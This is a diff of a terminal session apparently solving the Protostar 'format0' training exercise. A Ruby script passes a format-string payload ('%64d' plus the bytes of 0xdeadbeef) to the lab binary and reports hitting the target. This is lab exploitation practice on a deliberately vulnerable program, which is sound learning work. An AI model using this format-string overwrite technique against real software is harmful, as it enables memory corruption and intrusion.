@@ -1,9 +1,8 @@
 user@protostar:/tmp/format$ more format0.rb 
 #!/usr/bin/ruby
 
-padding = "AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPP";
+padding = "%64d";
 deadbeef = "\xef\xbe\xad\xde";
-#puts padding + deadbeef;
 
 command = <<-END
 /opt/protostar/bin/format0 #{padding + deadbeef}
@@ -12,4 +11,4 @@ END
 puts `#{command}`
 user@protostar:/tmp/format$ ./format0.rb 
 you have hit the target correctly :)
-user@protostar:/tmp/format$ 
+user@protostar:/tmp/format$
